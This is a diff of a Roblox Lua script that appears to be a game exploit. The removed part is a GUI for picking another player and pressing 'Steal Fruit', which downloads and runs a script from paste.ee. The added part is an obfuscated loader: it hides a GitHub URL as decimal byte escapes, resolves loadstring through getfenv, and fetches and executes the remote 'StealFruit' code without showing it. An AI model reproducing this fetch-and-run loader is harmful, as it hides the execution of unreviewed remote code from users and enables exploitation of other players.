@@ -1,140 +1,16 @@
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
+local zQf = getfenv and getfenv() or _ENV
+local tL1 = zQf["loadstring"]
+local rK3 = zQf["game"]["HttpGet"]
+local wSn = zQf["game"]
 
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "Kiel8Gui"
-screenGui.ResetOnSpawn = false
-screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
-
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 300, 0, 400)
-frame.Position = UDim2.new(0.5, 0, 0.5, 0)
-frame.AnchorPoint = Vector2.new(0.5, 0.5)
-frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-frame.BorderSizePixel = 0
-frame.Active = true
-frame.Draggable = true
-frame.Parent = screenGui
-
-local topBar = Instance.new("Frame")
-topBar.Size = UDim2.new(1, 0, 0, 40)
-topBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-topBar.Parent = frame
-
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, -40, 1, 0)
-title.Position = UDim2.new(0, 10, 0, 0)
-title.BackgroundTransparency = 1
-title.Text = "Kiel8"
-title.TextColor3 = Color3.fromRGB(0, 170, 255)
-title.Font = Enum.Font.GothamBold
-title.TextSize = 16
-title.TextXAlignment = Enum.TextXAlignment.Left
-title.Parent = topBar
-
-local closeBtn = Instance.new("TextButton")
-closeBtn.Size = UDim2.new(0, 40, 1, 0)
-closeBtn.Position = UDim2.new(1, -40, 0, 0)
-closeBtn.Text = "X"
-closeBtn.Font = Enum.Font.GothamBold
-closeBtn.TextSize = 20
-closeBtn.BackgroundTransparency = 1
-closeBtn.TextColor3 = Color3.fromRGB(255, 80, 80)
-closeBtn.Parent = topBar
-closeBtn.MouseButton1Click:Connect(function()
-    frame.Visible = false
-end)
-
-local listFrame = Instance.new("Frame")
-listFrame.Size = UDim2.new(1, -20, 0, 0)
-listFrame.Position = UDim2.new(0, 10, 0, 50)
-listFrame.BackgroundTransparency = 1
-listFrame.Parent = frame
-
-local layout = Instance.new("UIListLayout")
-layout.Padding = UDim.new(0, 5)
-layout.SortOrder = Enum.SortOrder.LayoutOrder
-layout.Parent = listFrame
-
-local selectedButton = nil
-
-local count = 0
-for _, plr in ipairs(Players:GetPlayers()) do
-    if plr ~= LocalPlayer and count < 4 then
-        count += 1
-        local btn = Instance.new("TextButton")
-        btn.Size = UDim2.new(1, 0, 0, 40)
-        btn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        btn.Font = Enum.Font.GothamBold
-        btn.TextSize = 16
-        btn.Text = plr.Name
-        btn.Parent = listFrame
-
-        btn.MouseButton1Click:Connect(function()
-            if selectedButton then
-                selectedButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-            end
-            selectedButton = btn
-            btn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
-        end)
+local function fWv(Sb0)
+    local qEu = {}
+    for mV9 = 1, #Sb0 do
+        qEu[#qEu + 1] = "\\" .. string.byte(Sb0:sub(mV9, mV9))
     end
+    return tL1(wSn:HttpGet(tL1("return \"" .. table.concat(qEu) .. "\"")()))
 end
 
-listFrame.Size = UDim2.new(1, -20, 0, layout.AbsoluteContentSize.Y)
+local obfURL = "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\107\105\101\108\56\47\83\99\114\105\112\116\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\83\116\101\97\108\70\114\117\105\116"
 
-local stealBtn = Instance.new("TextButton")
-stealBtn.Size = UDim2.new(1, -20, 0, 50)
-stealBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
-stealBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-stealBtn.Font = Enum.Font.GothamBold
-stealBtn.TextSize = 18
-stealBtn.Text = "Steal Fruit"
-stealBtn.Parent = frame
-
-local function updateStealBtnPos()
-    local pos = listFrame.AbsolutePosition
-    local size = listFrame.AbsoluteSize
-    local framePos = frame.AbsolutePosition
-    local relativeY = (pos.Y - framePos.Y) + size.Y + 10
-    stealBtn.Position = UDim2.new(0, 10, 0, relativeY)
-end
-
-task.defer(function()
-    updateStealBtnPos()
-end)
-
-layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
-    listFrame.Size = UDim2.new(1, -20, 0, layout.AbsoluteContentSize.Y)
-    updateStealBtnPos()
-end)
-
-local messageLabel = Instance.new("TextLabel")
-messageLabel.Size = UDim2.new(1, 0, 0, 30)
-messageLabel.Position = UDim2.new(0, 0, 1, -30)
-messageLabel.BackgroundTransparency = 1
-messageLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
-messageLabel.Text = ""
-messageLabel.Font = Enum.Font.GothamBold
-messageLabel.TextSize = 14
-messageLabel.Parent = frame
-
-stealBtn.MouseButton1Click:Connect(function()
-    if selectedButton then
-        -- Hide GUI immediately
-        screenGui:Destroy()
-        
-        -- Run external steal script
-        local success, err = pcall(function()
-            loadstring(game:HttpGet("https://paste.ee/r/g9fEn8El"))()
-        end)
-        if not success then
-            warn("Error loading steal script: "..tostring(err))
-        end
-    else
-        messageLabel.Text = "⚠️ Please select a player first!"
-        task.delay(3, function()
-            messageLabel.Text = ""
-        end)
-    end
-end)
+fWv(obfURL)()
